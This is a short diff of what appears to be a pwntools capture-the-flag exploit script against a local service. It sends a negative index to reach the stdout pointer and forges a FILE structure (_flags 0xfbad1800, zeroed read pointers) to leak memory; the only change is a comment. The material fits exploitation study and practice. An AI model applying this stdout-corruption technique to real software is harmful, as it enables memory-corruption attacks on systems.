@@ -84,7 +84,7 @@ sh = remote('localhost', 37325)
 
 # payload 1
 sh.sendline(b'-8') # locate stdout ptr
-payload = p64(0xfbad1800) # _flags
+payload = p64(0xfbad1800) # _flags though 32b data, takes 64b space
 payload += p64(0) # _IO_read_ptr，stdout不涉及输入，改成0就可以
 payload += p64(0) # _IO_read_end
 payload += p64(0) # _IO_read_base
